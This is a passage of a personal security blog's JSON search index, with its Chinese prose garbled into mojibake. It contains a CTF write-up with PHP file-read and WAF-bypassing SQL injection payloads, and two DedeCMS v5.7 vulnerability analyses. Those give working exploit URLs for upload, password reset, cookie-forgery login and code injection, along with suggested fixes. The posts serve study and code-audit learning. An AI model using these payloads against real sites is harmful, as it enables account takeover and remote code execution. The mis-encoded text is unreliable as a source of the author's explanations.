\\Symfony\\Component\\Cache\\CacheItem);åœ¨ç±»ä¸­è¿™ç§å†™æ³•ä¸å…è®¸ï¼Œ ç±»ï¼ˆå¯¹è±¡ï¼‰çš„å±æ€§æ˜¯ä¸èƒ½ç”¨éå¸¸é‡æ¥åˆå§‹åŒ–çš„ï¼ éå¸¸é‡æ˜¯æŒ‡å˜é‡ï¼Œæˆ–å‡½æ•°è¿”å›å€¼ç­‰ =====================åˆ†å‰²çº¿ 1ã€åœ¨ä¸€äº›ç‰¹å®šç‰ˆæœ¬ä¸‹ï¼Œpublicå’Œprivateå¯ä»¥é€šç”¨ï¼Œä¸ä¼šå½±å“æ•´ä¸ªååºåˆ—åŒ–æµç¨‹ï¼Œä½†æ˜¯è¿™é¢˜å¥½å·§ä¸å·§ï¼Œæ­£å¥½ç¢°åˆ°äº†ä¸€ä¸ªä¸å¯é€šç”¨çš„ï¼Œå­—æ®µè¯¥ä»€ä¹ˆå±æ€§å°±å¾—ä»€ä¹ˆå±æ€§ã€‚ 2ã€ç†è®ºä¸Šåºåˆ—åŒ–ç¡®å®æ²¡å¿…è¦å†™æ¥å£ï¼Œä¸€èˆ¬éƒ½æ˜¯å˜é‡çš„æ“ä½œ 3ã€ä¸€èˆ¬åœ¨__construct()ä¸­å†™ ====================åˆ†å‰²çº¿ çœ‹wpçš„æ—¶å€™çœ‹åˆ°szsï¼Œ åˆ©ç”¨highlight_file(&#39;/flag&#39;,null) ï¼Œä½†æ˜¯è¿™é‡Œç¬¬äºŒä¸ªå‚æ•°$itemè¦ä¸ºnullï¼Œä¼¼ä¹ä¸å¥½æ„é€  æœ€åæ•´ç†ä¸‹POPé“¾ TagAwareAdapter.php-&gt;__destruct()-&gt;commit()-&gt;invalidateTags()-&gt;$this-&gt;pool-&gt;saveDeferred($item) ProxyAdapter.php-&gt;saveDeferred()-&gt;doSave()-&gt;($this-&gt;setInnerItem)($innerItem, $item) å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/5911#toc-2","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›-wp","slug":"ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›-wp","date":"2019-11-02T08:52:39.000Z","updated":"2020-04-10T13:33:54.145Z","comments":true,"path":"2019/11/02/ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›-wp/","link":"","permalink":"https://glotozz.github.io/2019/11/02/%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• WEB1 WEB2 WEB3 WEB4 å‚è€ƒé“¾æ¥ï¼š WEB1 åŸé¢˜çš„payload 1echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))))); è¿™é‡Œæ˜¯bytectfçš„å‡çº§ç‰ˆï¼Œå‡½æ•°åªèƒ½ç”±[a-z]ï¼Œæ²¡æœ‰ä¸‹åˆ’çº¿ã€‚ã€‚ã€‚å¹¶ä¸”è¿‡æ»¤äº†readfileï¼Œtimeï¼Œet readfile()ï¼Œå¯ç”¨echo()æˆ–è€…die()ä»£æ›¿ ç„¶åæ˜¯ç”±äºsqrt()è¢«è¿‡æ»¤ï¼Œå¯¼è‡´å¾—é‡æ–°fuzzå‡ºä¸€ä¸ªç‚¹æ¥ 1chr(ceil(sinh(cosh(tan(floor(abs(tan(cosh(floor(phpversion())))))))))) ä¸‹é¢æ˜¯ä¹‹åfuzzå‡º0æ—¶çš„æˆªå›¾ å°†payloadæ‹†å¼€æ¥ï¼Œé‚£ä¹ˆåªéœ€è¦æ‰¾å‡ºä»»æ„ä¸€æ­¥äº§ç”Ÿç›¸åŒå€¼å³å¯ 12345678910&lt;?php $a &#x3D; [&#39;sinh(&#39;,&#39;ceil(&#39;,&#39;cosh(&#39;,&#39;tan(&#39;,&#39;floor(&#39;,&#39;abs(&#39;]; foreach($a as $i)&#123; foreach($a as $j)&#123; foreach($a as $k)&#123; $res &#x3D; $i.$j.$k.&#39;0)))&#39;; echo &#39;echo &#39;.$res.&#39;.&quot;\\n&quot;;&#39;.&quot;\\n&quot;; &#125; &#125; &#125; å°†ç»“æœç›´æ¥å¤åˆ¶åˆ°å¦ä¸€ä¸ªè„šæœ¬ä¸­è·‘ğŸ˜ é‚£ä¹ˆè¿™ä¸ª1.46åªéœ€è¦ceil()å³å¯äº§ç”Ÿ2 æ„é€ å‡ºç‚¹åï¼Œæ„é€ ç‚¹ç‚¹ 1next(scandir(&#39;.&#39;)) ç„¶åéœ€è¦è§£å†³çš„æ˜¯chdir()çš„è¿”å›å€¼ä¼ ç»™ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”è¿”å›å€¼ä¸ºæ•°å­—ã€‚ã€‚ã€‚ æˆ‘åˆ©ç”¨çš„æ˜¯ord(phpversion(chdir(&#39;..&#39;)))è¿”å›0ï¼Œ è¿™é‡Œå…¶å®tan()ã€sin()ç­‰æ•°å­¦å‡½æ•°éƒ½å¯ä»¥ï¼Œè¿™é‡Œè¿”å›çš„trueä¼šè½¬åŒ–ä¸º1ï¼Œè‡ªå·±ç®—æ˜¯å¤šæ­¤ä¸€ä¸¾äº† æœ€åè¯»å–ï¼Œåˆ©ç”¨end()è¯»å–æ–‡ä»¶åï¼Œimplode()å°†file()æŒ‰è¡Œè¯»å–çš„å†…å®¹åˆå¹¶æˆå­—ç¬¦ä¸²ï¼Œecho()å³å¯ 1echo(implode(file(end(scandir(chr(ceil(sinh(cosh(tan(ceil(sinh(sinh(cosh(ord(phpversion(chdir(next(scandir(next(scandir(chr(ceil(sinh(cosh(tan(floor(abs(tan(cosh(floor(phpversion()))))))))))))))))))))))))))))))); WEB2å®‰æ’æ¯æœˆèµ›åŸé¢˜,payloadéƒ½ä¸ç”¨æ¢ï¼Œ8è¯´äº† https://www.jianshu.com/p/804d95f6d6fb?tdsourcetag=s_pctim_aiomsg WEB3ä¸»è¦è¿‡æ»¤äº†and,or,select union,é€—å·ç­‰ è€ƒè™‘è”åˆæ³¨å…¥ ç›²æ³¨ä¹Ÿå¯ï¼Œorç”¨||ä»£æ›¿ ä¸å¸¦é€—å·çš„è”åˆæ³¨å…¥ï¼ˆæœ¬åœ°ï¼‰ 1select * from users where id&#x3D;1 union&#x2F;**&#x2F;select * from ((select 1)a join (select 2)b join (select 1)c) payload 10&#39; union&#x2F;**&#x2F;select * from ((select 1)a join (select 2)b join (select 3)C join(select 4)D)# 1%30%27%20%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%28%28%73%65%6c%65%63%74%20%31%29%61%20%6a%6f%69%6e%20%28%73%65%6c%65%63%74%20%32%29%62%20%6a%6f%69%6e%20%28%73%65%6c%65%63%74%20%31%29%43%20%6a%6f%69%6e%28%73%65%6c%65%63%74%20%32%29%44%29%23 è¿‡æ»¤äº†orï¼Œè€ƒè™‘innodbï¼Œ MySQL 5.7ä¹‹åçš„ç‰ˆæœ¬ï¼Œåœ¨å…¶è‡ªå¸¦çš„ mysql åº“ä¸­ï¼Œæ–°å¢äº†innodb_table_stats å’Œinnodb_index_statsè¿™ä¸¤å¼ æ—¥å¿—è¡¨ã€‚å¦‚æœæ•°æ®è¡¨çš„å¼•æ“æ˜¯innodb ï¼Œåˆ™ä¼šåœ¨è¿™ä¸¤å¼ è¡¨ä¸­è®°å½•è¡¨ã€é”®çš„ä¿¡æ¯ ã€‚å¦‚æœwafæ‰äº†informationæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤ä¸ªè¡¨æ³¨å…¥æ•°æ®åº“åå’Œè¡¨åã€‚ æœ‰ç‚¹å¥‡æ€ªçš„æ˜¯æ•°æ®åº“ç‰ˆæœ¬æ˜¯5.6.46 å¹¸è¿çš„æ˜¯ä¸‹é¢çš„payloadæŸ¥åˆ°äº†è¡¨å 12select group_concat(distinct database_name) from mysql.innodb_index_statsselect group_concat(distinct table_name) from mysql.innodb_index_stats è€ƒè™‘æ— åˆ—åæ³¨å…¥(éœ€è¦çŒœæµ‹å­—æ®µæ•°) 1select GROUP_CONCAT(&#96;3&#96;) from (select * from((select 1)A Join (select 2)B join (select 3)C) union&#x2F;**&#x2F;select * from users)D æœ€ç»ˆpayload 1?id&#x3D;0%27%20UNION&#x2F;**&#x2F;select%20*%20from%20((((select%201)A%20join%20((select%20GROUP_CONCAT(%603%60)%20from%20(select%20*%20from((select%201)A%20Join%20(select%202)B%20join%20(select%203)C)%20union&#x2F;**&#x2F;select%20*%20from%20fl111aa44a99g)T))B)%20join%20(select%203)C)join%20(select%204)D)%23 1?id&#x3D;0&#39; UNION&#x2F;**&#x2F;select * from ((((select 1)A join ((select GROUP_CONCAT(&#96;3&#96;) from (select * from((select 1)A Join (select 2)B join (select 3)C) union&#x2F;**&#x2F;select * from fl111aa44a99g)T))B) join (select 3)C)join (select 4)D)# WEB42019å·…å³°æå®¢ä¸€é“é¢˜çš„å‡çº§ç‰ˆ https://www.4hou.com/web/21053.html ç”±äºæˆ‘æ— æ³•ç›®å½•éå†è¯»å–æºç ï¼Œå¯¼è‡´æ²¡çš„æäº†ã€‚ã€‚ã€‚ å‚è€ƒé“¾æ¥ï¼š https://www.anquanke.com/post/id/186187#h3-1","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"dedecms_v5.7æ¼æ´åˆ†æ-2","slug":"dedecms-v5-7æ¼æ´åˆ†æ-2","date":"2019-09-23T23:24:11.000Z","updated":"2020-04-10T03:08:35.116Z","comments":true,"path":"2019/09/24/dedecms-v5-7æ¼æ´åˆ†æ-2/","link":"","permalink":"https://glotozz.github.io/2019/09/24/dedecms-v5-7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†æ å››ã€æ¼æ´ä¿®å¤ å‚è€ƒé“¾æ¥ ä¸€ã€è·å–æ¼æ´Dedecms V5.7 äºŒã€æ¼æ´å®ç° æ¼æ´ä¸€ï¼ˆDedeCMS V5.7 SP2å‰å°æ–‡ä»¶ä¸Šä¼ æ¼æ´ (CVE-2018-20129)ï¼‰ å¼€å¯ä¼šå‘˜åŠŸèƒ½ï¼Œè¿›å…¥ä¼šå‘˜ä¸­å¿ƒï¼Œå†…å®¹ä¸­å¿ƒï¼Œå‘è¡¨æ–‡ç«  ä¸Šä¼ åˆ°æœåŠ¡å™¨æ—¶æŠ“åŒ…ï¼Œå°†filenameä¿®æ”¹ä¸º1.jpg.p*hpï¼Œå¾—åˆ°ä¸Šä¼ æˆåŠŸçš„åœ°å€ èšå‰‘è¿æ¥ æ¼æ´äºŒ å‰å°ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹ Paylaod: åˆ›å»ºä¸€ä¸ªç”¨æˆ·123ï¼Œidä¸º9ä½œä¸ºæˆ‘ä»¬è¦ä¿®æ”¹å¯†ç çš„å¯¹è±¡ å†åˆ›å»ºä¸€ä¸ªç”¨æˆ·456ï¼Œç™»å½•åè®¿é—®ä¸‹é¢çš„payload 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;member&#x2F;resetpassword.php?i&#x3D;0.0&amp;dopost&#x3D;safequestion&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;&amp;id&#x3D;9 æŠ“åŒ… è®¿é—® 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;9&amp;key&#x3D;8oav2fjP å³å¯é‡ç½®å¯†ç  æ¼æ´ä¸‰ ä»»æ„ç”¨æˆ·ç™»å½• å‰å°ä¼šå‘˜æ¨¡å—æ˜¯é‡‡ç”¨Cookieä¸­çš„ DedeUserID+DedeUserID__ckMd5å­—æ®µè¿›è¡Œèº«ä»½é‰´åˆ« DedeUserIDç”¨äºå®šä½åŒºåˆ«ç”¨æˆ·ï¼ŒDedeUserID__ckMd5åˆ™æ˜¯æœåŠ¡å™¨ç”Ÿæˆæ•£åˆ—ï¼Œç”¨äºå®‰å…¨éªŒè¯ Dedecmsä¸€å¤„ä»£ç ç”±äºé€»è¾‘ä¸å¤Ÿä¸¥è°¨ï¼Œå¯¼è‡´å¯ä»¥è¾“å…¥å­—ç¬¦å¹¶è·å¾—æœåŠ¡å™¨ç”Ÿæˆæ•£åˆ— åŠ«æŒDedeUserID__ckMd5å­—æ®µï¼Œç»•è¿‡å®‰å…¨æ ¡éªŒï¼Œé…åˆç±»å‹è½¬æ¢é€ æˆä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ æ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œç”¨æˆ·åæ»¡è¶³æ•°å­—1+å­—æ¯çš„å½¢å¼ï¼Œæˆ–è€…ç»è¿‡intval()åå€¼ä¸º1ï¼Œ è®¿é—®ç”¨æˆ·ä¸»é¡µï¼Œè®°å½•cookieä¸­last_vid__ckMd5çš„å€¼ è®¿é—®indexé¡µé¢ï¼Œæ›¿æ¢cookieä¸­DedeUserIDå’ŒDedeUserID__ckMd5çš„å€¼ï¼Œæ›¿æ¢æˆæˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·åå’Œlast_vid__ckMd5ï¼Œå°±èƒ½ç™»å½•åˆ°å‰å°admin æ¯”å¦‚1aaa,è®¿é—®ç©ºé—´ ä¿®æ”¹DeDeUserIDå’ŒDeDeUserID_CKmD5 æ¼æ´å›› æ¼æ´äºŒ+æ¼æ´ä¸‰çš„ç»„åˆæ‹³ï¼Œä¿®æ”¹åå°ç®¡ç†å‘˜adminå¯†ç  å› ä¸ºæ¼æ´äºŒåªèƒ½ä¿®æ”¹å‰å°memberä¸­adminå¯†ç ï¼Œä½†æ˜¯ä¼šå‘˜åˆæ— æ³•ç™»å½•å‰å°ï¼Œåˆ©ç”¨æ¼æ´ä¸‰å¯å‰å°ç™»å½•adminï¼Œè¿›å…¥member/edit_baseinfo.phpï¼Œä¿®æ”¹å¯†ç å³å¯ï¼ŒåŸç™»å½•å¯†ç æ˜¯dede_memberè¡¨ä¸­adminçš„å¯†ç  åˆ©ç”¨æ¼æ´ä¸‰ä¸­çš„æ–¹æ³•adminè®¿é—®http://127.0.0.1/dede/member/edit_baseinfo.php ä¿®æ”¹å¯†ç  æ³¨æ„è¿™é‡Œè¿˜æ˜¯è¦å‘åŒ…ä¿®æ”¹DedeUserID+DedeUserID__ckMd5ï¼ŒæˆåŠŸä¿®æ”¹åå°adminå¯†ç  ç™»å½•åå°æˆåŠŸ ä¸‰ã€æ¼æ´åˆ†æ æ¼æ´ä¸€ æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ å¤„çš„æºç ï¼ˆbpæŠ“åŒ…æŸ¥çœ‹æ–‡ä»¶ä½ç½®å³å¯ï¼‰ select_images_post.php preg_replace()å°†\\r\\n\\t*%?&lt;&gt;|â€:æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥ä¿®æ”¹filenameæ—¶&lt;&gt;%ç­‰ä¹Ÿå¯ä»¥ 1$cfg_imgtype &#x3D; &#39;jpg|gif|png&#39;; preg_match()åˆ¤æ–­æ˜¯å¦èƒ½åŒ¹é…åˆ°$cfg_imgtype ä¹‹åæ˜¯å¯¹æ–‡ä»¶åè¿›è¡Œé‡å‘½åï¼Œä½†æ˜¯ä¸å½±å“ æ¼æ´äºŒ /member/resetpassword.php æˆ‘ä»¬ä¼ å…¥id=1ï¼Œæ•°æ®åº“æŸ¥è¯¢å¦‚ä¸‹ç»“æœ ==å¼±ç›¸ç­‰æ¯”è¾ƒ+empty()ï¼Œå¦‚æœä¼ å…¥0ä¹Ÿä¸è¡Œï¼Œå› ä¸º0æ— æ³•ç»•è¿‡empty()ï¼Œæˆ‘ä»¬ä¼ å…¥safequestion=0.0&amp;safeanswer=ï¼Œå½“ç„¶16è¿›åˆ¶ä¹Ÿå¯ä»¥0x0 å³å¯è¿›å…¥sn()ï¼Œè¿½è¸ªsn() è¿™é‡ŒæŸ¥è¯¢ä¸€ä¸ªä¸´æ—¶å¯†ç è¡¨ï¼Œå¦‚æœä¸å­˜åœ¨å¯¹åº”çš„æ•°æ®rowå°±å‘é€é‚®ä»¶ï¼Œå½“ç„¶ä¸€å¼€å§‹æ˜¯ä¸å­˜çš„ï¼ŒæŸ¥çœ‹newmail() å­˜åœ¨ä¸€ä¸ªå¯¹#@__pwd_tmpè¡¨insertæ“ä½œï¼Œä¹‹åé‡å®šå‘ è®¿é—®ä¿®æ”¹å¯†ç ã€‚ ä½†æ˜¯è¿™é‡Œadminé»˜è®¤æ— æ³•åœ¨ä¼šå‘˜ä¸­å¿ƒç™»å½•ã€‚ã€‚ã€‚ä½†æ˜¯å¯ä»¥ä¿®æ”¹å…¶ä»–ä»»æ„ç”¨æˆ·ï¼Œåªæ˜¯è¦æ±‚å½“å‰ç”¨æˆ·æ²¡æœ‰å¡«å†™å¯†ä¿é—®é¢˜ æ¼æ´ä¸‰ ä»member/index.phpå…¥æ‰‹ï¼Œå› ä¸ºæœ€åæˆ‘ä»¬æ˜¯ä¿®æ”¹DeDeUserIDå’ŒDeDeUserID_CKmD5æ¥ç»•è¿‡ç™»å½• å­˜åœ¨IsLogin()åˆ¤æ–­ï¼Œè·Ÿè¿›isLogin()å‡½æ•° è·Ÿè¿›$this-&gt;M_ID è·Ÿè¿›GetNum() å°†é(æ•°å­—æˆ–ç‚¹)çš„æ›¿æ¢ä¸ºç©ºï¼Œç»§ç»­è·Ÿè¿›GetCookie() åˆ¤æ–­cookieä¸­çš„DeDeUserID_ckMd5ä¸md5($cfg_cookie_encode.$_COOKIE[$key])çš„å‰16ä½æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ï¼Œåªè¦è¿‡äº†è¿™ä¸ªåˆ¤æ–­å°±æ²¡å•¥é—®é¢˜äº†ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»»æ„ç”¨æˆ·çš„ä¸€ç»„æ¥ç»•è¿‡ï¼Œä½†æ˜¯DeDeUserIDç»è¿‡GetNum()è¦ä¸º1ï¼Œæ¯”å¦‚1aaaaï¼Œæˆ–è€…intcal()åä¸º1ï¼Œæ¯”å¦‚0000001ï¼Œåˆ©ç”¨è¿™é‡Œçš„æ¼æ´ï¼Œå³å¯æˆåŠŸç™»å½•admin é‚£ä¹ˆå¦‚ä½•è·å–DeDeUserID_ckMd5ä¸md5($cfg_cookie_encode.$_COOKIE[$key]) å­˜åœ¨PutCookie()ï¼Œè·Ÿè¿›ä¸‹ æ‰€ä»¥è®¿é—®ä¼šå‘˜ç©ºé—´ä¸»é¡µå³å¯å¾—åˆ°last_vidå’Œlast_vid__ckMd5ã€‚ æ¼æ´å›› ä¸»è¦æ˜¯ä¿®æ”¹ä¸ªäººä¿¡æ¯edit_baseinfo.phpä¸­å­˜åœ¨å¦‚æœæ˜¯ç®¡ç†å‘˜ï¼Œä¿®æ”¹å…¶åå°å¯†ç ã€‚ã€‚ã€‚ğŸ˜‹ å…·ä½“ç»†èŠ‚å°±æ˜¯æ¼æ´äºŒä¸‰ å››ã€æ¼æ´ä¿®å¤å¯¹äºæ¼æ´ä¸€ï¼Œå¯ä»¥å¯¹å–åˆ°çš„$fs[count($fs)-1]è¿›è¡Œç™½åå•æ ¡éªŒï¼Œè€Œä¸æ˜¯ç›´æ¥å¯¹filenameè¿›è¡Œpreg_match() å¯¹äºæ¼æ´äºŒï¼Œresetpassword.phpæ–‡ä»¶84è¡Œ 1if($row[&#39;safequestion&#39;] &#x3D;&#x3D; $safequestion &amp;&amp; $row[&#39;safeanswer&#39;] &#x3D;&#x3D; $safeanswer) ä¿®æ”¹ä¸ºå¼ºç›¸ç­‰ï¼Œæˆ–è€…å¼ºåˆ¶è¦æ±‚ç”¨æˆ·è®¾ç½®å¯†ä¿é—®é¢˜ å¯¹äºæ¼æ´ä¸‰ï¼Œå°†ç”Ÿæˆä¸åŒåœºæ™¯ä¸‹cookieä½¿ç”¨çš„$cfg_cookie_encodeå˜é‡åŒºåˆ†å¼€æ¥ï¼Œé¿å…ç›¸åŒã€‚æˆ–è€…ç”¨sessionå­˜å‚¨ å¯¹äºæ¼æ´å››ï¼Œç›´æ¥åˆ å»å¯¹åå°å¯†ç çš„ä¿®æ”¹ å‚è€ƒé“¾æ¥https://mp.weixin.qq.com/s/PCg973wOTeVYvb8-b6R3ZA https://mochazz.github.io/ https://xz.aliyun.com/t/1961 http://blog.nsfocus.net/dedecms-loophole-2/","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"dedecms_v5.7æ¼æ´åˆ†æ","slug":"dedecms-v5-7æ¼æ´åˆ†æ","date":"2019-09-22T23:21:12.000Z","updated":"2020-04-02T02:42:27.151Z","comments":true,"path":"2019/09/23/dedecms-v5-7æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2019/09/23/dedecms-v5-7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€è·å–æ¼æ´ äºŒã€æ¼æ´å®ç° ä¸‰ã€æ¼æ´åˆ†æ å››ã€æ¼æ´ä¿®å¤ å‚è€ƒé“¾æ¥ ä¸€ã€è·å–æ¼æ´dedecms V5.7 äºŒã€æ¼æ´å®ç°Payload1 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;sys_verifies.php?action&#x3D;getfiles&amp;refiles[]&#x3D;\\%22;phpinfo();&#x2F;&#x2F; Payload2 12http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;stepselect_main.php?action&#x3D;addenum_save&amp;ename&#x3D;233&amp;issign&#x3D;1&amp;egroup&#x3D;;phpinfo();$http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;data&#x2F;enums&#x2F;;phpinfo();$.php Payload3 12http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;tpl.php?action&#x3D;savetagfile&amp;token&#x3D;57b2990048a7dbd3c782cddc0a049a0d&amp;filename&#x3D;glotozz.lib.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;include&#x2F;taglib&#x2F;glotozz.lib.php Payload4 12æ’å…¥adå†…å®¹ --&gt;&lt;?php phpinfo();?&gt;http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;plus&#x2F;ad_js.php?nocache&#x3D;1&amp;aid&#x3D;1 ä¸‰ã€æ¼æ´åˆ†æ å…ˆæ ¹æ®payload1è‡ªå·±åœ¨å½“å‰æ–‡ä»¶å¯»æ‰¾åˆ†æä¸€æ³¢ æœç´¢fwrite()ï¼Œå‘ç°ç¬¬ä¸€å¤„ è¿½è¸ªå˜é‡$tmpdir æ‰“æ‰°äº†ã€‚ã€‚ã€‚æŸ¥çœ‹ç¬¬äºŒå¤„ æœç´¢ä¸‹$refilesï¼Œæ˜¯æˆ‘ä»¬ç›´æ¥ä¼ å…¥çš„å˜é‡ã€‚ã€‚ã€‚ å…ˆæˆªå–[3:]ï¼Œä¸­é—´çš„å¯ä»¥ä¸ç®¡ï¼Œå› ä¸ºä¸å½±å“$filenameï¼Œ$i++ï¼Œå†™å…¥æ ¼å¼å¤§æ¦‚å¦‚ä¸‹ 123&lt;?php$files[0]&#x3D;&quot;xxx&quot;;?&gt; æ„é€ å¦‚ä¸‹å³å¯ 123&lt;?php$files[0]&#x3D;&quot;&quot;;phpinfo();&#x2F;&#x2F;&quot;;?&gt; å¯¹é‚£ä¸ªæˆªå–[3:]æœ‰ç‚¹ç–‘æƒ‘ï¼Œæ„é€  â€œ;phpinfo();// è°ƒè¯•æ‰“å°ä¸‹$filenameï¼Œå‘ç°åŸæ¥æ˜¯å­˜åœ¨addslashes() æ—¢ç„¶æ˜¯æˆªå–[3:]ï¼Œæ„é€ å¦‚ä¸‹å³å¯ 123\\&quot;&#x3D;&gt;\\\\\\&quot; æŸ¥çœ‹modifytmp.inc æˆåŠŸå†™å…¥åè€ƒè™‘åŒ…å«çš„åœ°æ–¹ï¼Œå‘ç°å°±åœ¨ä¸‹é¢ã€‚ã€‚ã€‚æ‰€ä»¥ä¸Šé¢æˆ‘ä»¬çš„payloadåªéœ€è¦ä¸€ä¸ªaction=getfileså³å¯ ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸é‡æ–°è®¿é—®action=downä¹Ÿå¯ä»¥ï¼Œå› ä¸ºgetfilesä¸­ä¸‹é¢çš„è¯­å¥å°±æ˜¯å»åŠ è½½æ¨¡æ¿æ–‡ä»¶ï¼Œè€Œæ¨¡ç‰ˆæ–‡ä»¶ä¸­iframeåŠ è½½äº†æˆ‘ä»¬éœ€è¦çš„downï¼Œå½“ç„¶æˆ‘ä»¬è‡ªå·±å»è®¿é—®ä¹Ÿè¡Œï¼Œè¿˜å¯ä»¥æ§åˆ¶å‚æ•° Payload1çš„æ¼æ´æˆå› ä¸»è¦æ˜¯fwriteï¼Œä»¥åŠå…ˆaddslashes()åè¿›è¡Œäº†substr()æˆªå– åˆ†æä¸‹Paylaod2 è¿™é‡Œæ˜¯åˆ©ç”¨enums.func.phpä¸­çš„fwrite() å†™å…¥æ ¼å¼å¤§æ¦‚å¦‚ä¸‹ 123&lt;?phpglobal $em_&quot;&quot;s;$em_&quot;&quot;s &#x3D; array(); å°è¯•æ„é€  123456&lt;?phpglobal $em_;phpinfo();$s;$em_&quot;&quot;s &#x3D; array();&#x3D;&#x3D;&gt;;phpinfo();$ æœç´¢è°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹ï¼Œå¹¶ä¸”æˆ‘ä»¬æ§åˆ¶ä¼ å…¥çš„å˜é‡,ä¸”æ²¡æœ‰ä¸¥æ ¼è¿‡æ»¤ stepselect_main.phpä¸­çš„action=addnum_save ä¼ å…¥$enameå’Œ$egroupå’Œ$issign=1å³å¯ï¼Œ æŸ¥çœ‹data/enums/;phpinfo();$.php è®¿é—®å³å¯ Payload3 åœ¨tpl.phpä¸­å¯»æ‰¾fwrite() æ–‡ä»¶åè¦æ±‚ç”±[a-z0-9_-]ç»„æˆï¼Œåç¼€ä¸º.lib.php stripslashes()å‡½æ•°åˆ é™¤ç”± addslashes()å‡½æ•°æ·»åŠ çš„åæ–œæ ï¼Œæ–‡ä»¶å†…å®¹ä¸å½±å“ è¿˜è¦æ³¨æ„çš„å°±æ˜¯å¼€å¤´æœ‰ä¸ªcsrf_check() ç»§ç»­æœç´¢$_SESSION[&#39;token&#39;] è°ƒç”¨è¿™é‡Œçš„action=uploadå¾—åˆ°tokenå³å¯ï¼Œå¯ä»¥ä»å‰ç«¯é‚£ä¸ªéšè—çš„inputè·å–ï¼Œå…¶å®å°±æ˜¯make_hash()ï¼Œæ‰“ä¸ªæ–­ç‚¹å³å¯ 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;tpl.php?action&#x3D;savetagfile&amp;token&#x3D;57b2990048a7dbd3c782cddc0a049a0d&amp;filename&#x3D;glotozz.lib.php&amp;content&#x3D;&lt;?php phpinfo();?&gt; å†å»æ‰¾åˆ°æ–‡ä»¶è·¯å¾„DEDEINCï¼Œéšä¾¿æ‰¾ä¸ªåœ°æ–¹æ‰“ä¸ªæ–­ç‚¹å³å¯ è®¿é—®å³å¯ Paylaod4 ad_js.phpå­˜åœ¨fwrite()+include ä»æ•°æ®åº“#@__myadè¯»å–ï¼Œæœç´¢æ’å…¥æ•°æ®åº“çš„åœ°æ–¹ ad_add.php å‘ç°æ²¡æœ‰ä»€ä¹ˆå¯¹æˆ‘ä»¬æœ‰å½±å“çš„è¿‡æ»¤ï¼Œç›´æ¥åœ¨å‰ç«¯é¡µé¢æ’å…¥ï¼Œæ³¨æ„é—­åˆå‰é¢çš„â€“&gt; 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;dede&#x2F;ad_add.php 1--&gt;&lt;?php phpinfo();?&gt; å†æ¬¡è®¿é—®å³å¯ 1http:&#x2F;&#x2F;127.0.0.1&#x2F;dede&#x2F;plus&#x2F;ad_js.php?arcID&#x3D;1&amp;nocache&#x3D;1 å››ã€æ¼æ´ä¿®å¤å¤§å¤šæ•°éƒ½æ˜¯fwrite()æ—¶æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œéƒ½å¯ä»¥ç®€å•é—­åˆæˆ–æ‹¼æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè¿‡æ»¤ä¸€äº›å…³é”®å­—ç¬¦ã€‚ 